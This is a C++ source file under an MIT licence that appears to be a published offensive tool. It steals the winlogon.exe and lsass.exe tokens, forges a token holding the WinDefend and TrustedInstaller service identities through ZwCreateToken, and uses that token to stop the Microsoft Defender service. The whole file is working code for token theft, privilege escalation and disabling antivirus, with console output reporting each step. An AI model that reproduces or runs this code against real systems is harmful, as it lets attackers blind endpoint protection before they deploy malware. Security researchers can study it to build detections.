/*MIT License

Copyright(c) 2022 lab52.io

Permission is hereby granted, free of charge, to any person obtaining a copy
of this softwareand associated documentation files(the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions :

The above copyright noticeand this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <tchar.h>
#include <sddl.h>
#include "ntdll.h"
#include "util.h"

/// <summary>
/// Opens a user provided process by name and steals token for impersonation
/// </summary>
/// <param name="pname">Process Name</param>
/// <param name="retHandle">Return Token Handle</param>
/// <returns></returns>
BOOL ImpersonateProcessTokenByName(PCTSTR pname, PHANDLE retHandle) {

	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;

	// Searching for Winlogon PID 
	DWORD PID_TO_IMPERSONATE = GetProcessByName(pname);

	if (PID_TO_IMPERSONATE == NULL) {
		_tprintf(TEXT("[-] %s process not found\n"), pname);
		return FALSE;
	}
	else
		_tprintf(TEXT("[+] %s process found!\n"), pname);

	// Call OpenProcess() to open WINLOGON, print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		_tprintf(TEXT("[+] %s OpenProcess() success!\n"), pname);
	else
	{
		_tprintf(TEXT("[-] %s OpenProcess() Return Code: %i\n"), pname, processHandle);
		_tprintf(TEXT("[-] %s OpenProcess() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE, &tokenHandle);
	if (GetLastError() == NULL)
		_tprintf(TEXT("[+] %s OpenProcessToken() success!\n"), pname);
	else
	{
		_tprintf(TEXT("[-] %s OpenProcessToken() Return Code: %i\n"), pname,  getToken);
		_tprintf(TEXT("[-] %s OpenProcessToken() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}


	if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, retHandle)){
		_tprintf(TEXT("[-] %s OpenProcessToken() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	
	_tprintf(TEXT("[+] %s DuplicateTokenEx() success!\n"), pname);

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(*retHandle);
	if (GetLastError() == NULL)
	{
		_tprintf(TEXT("[+] %s ImpersonatedLoggedOnUser() success!\n"), pname);
		_tprintf(TEXT("[+] %s Current user is: %s\n"), pname, (get_username()).c_str());
	}
	else
	{
		_tprintf(TEXT("[-] %s ImpersonatedLoggedOnUser() Return Code: %i\n"), pname, getToken);
		_tprintf(TEXT("[-] %s ImpersonatedLoggedOnUser() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	// Closing not necessary handles
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);

	// Print whoami to compare to thread later
	_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());

	return TRUE;
}

/// <summary>
/// Gets infomration from a provided token
/// </summary>
/// <param name="current_token">Token handle</param>
/// <param name="tic">Token information structure</param>
/// <returns></returns>
PVOID GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
{
	DWORD n;
	PVOID data;

	if (!GetTokenInformation(current_token, tic, 0, 0, &n) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	data = (PVOID)malloc(n);

	if (GetTokenInformation(current_token, tic, data, n, &n))
		return data;
	else
		free(data);

	return 0;
}

/// <summary>
/// Forge a new token with TrustedInstaller & Windefend service accounts using
/// a base token
/// </summary>
/// <param name="base_token">Current token</param>
/// <returns></returns>
HANDLE CreateTokenWinDefend(HANDLE base_token)
{
	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	DWORD sessionId;
	HANDLE elevated_token;

	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	PISID pSidSingle;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
	PSID lpSidOwner = NULL;
	LUID authid = SYSTEM_LUID;
	PSID group1, group2;

	// TrustedInstaller SID
	BOOL t = ConvertStringSidToSid(TEXT("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"), &group2);

	//Windefend SID
	t = ConvertStringSidToSid(TEXT("S-1-5-80-1913148863-3492339771-4165695881-2087618961-4109116736"), &group1);

	_ZwCreateToken ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		_tprintf(TEXT("[-] Failed to load ZwCreateToken: %d\n"), GetLastError());
		return NULL;
	}

	DWORD dwBufferSize = 0;
	PTOKEN_USER user;
	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);

	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;

	privileges = (PTOKEN_PRIVILEGES)GetInfoFromToken(base_token, TokenPrivileges);

	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);

	pSid = groups->Groups;
	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_AUTHENTICATED_USER_RID) {
			pSid->Sid = group1;
			pSid->Attributes = SE_GROUP_ENABLED;
		}

		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_WORLD_RID) {
			pSid->Sid = group2;
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_ADMINS) {
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = user->User.Sid;
	//owner->Owner = GetLocalSystemSID();

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		TokenImpersonation,
		pluidAuth,
		pli,
		user,
		//&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken 
	);

	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		_tprintf(TEXT("[-] Failed to create new token: %d %08x\n"), GetLastError(), ntStatus);

	FreeSid(lpSidOwner);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);

	return NULL;
}


int __cdecl _tmain(int argc, TCHAR* argv[]) {

	HANDLE impersonatedTokenHandle = NULL;
	// Print whoami to compare to thread later
	_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());

	//Step 1: Get System token and impersonate in current thread avoiding SeDebugPriv
	if (!ImpersonateProcessTokenByName(TEXT("winlogon.exe"), &impersonatedTokenHandle))
		exit(1);
	
	//Step 2: Get a token with SeCreateTokenPriv enabled Ex. Lsass.exe have it
	if (!ImpersonateProcessTokenByName(TEXT("lsass.exe"), &impersonatedTokenHandle))
		exit(1);

	//Step3: Forge a new token with Windefend and TrustedInstaller service accounts
	impersonatedTokenHandle = CreateTokenWinDefend(impersonatedTokenHandle);

	if (impersonatedTokenHandle == NULL)
		exit(1);
	
	_tprintf(TEXT("[+] CreateTokenWinDefend success!\n"));

	//Step 3: Impersonate with forged token
	if (ImpersonateLoggedOnUser(impersonatedTokenHandle))
	{
		_tprintf(TEXT("[+] ImpersonatedLoggedOnUser() success!\n"));
		_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());
	}
	else
	{
		_tprintf(TEXT("[-] ImpersonatedLoggedOnUser() Error: %i\n"), GetLastError());
		return FALSE;
	}
	
	//Step 4: Finally Stop the defender service
	if (StopDefenderService()) {
		_tprintf(TEXT("[+] StopDefenderServices success!\n"));
	}
	else {
		_tprintf(TEXT("[-] StopDefenderServices Error: %i\n"), GetLastError());
	}
	
	return 0;
}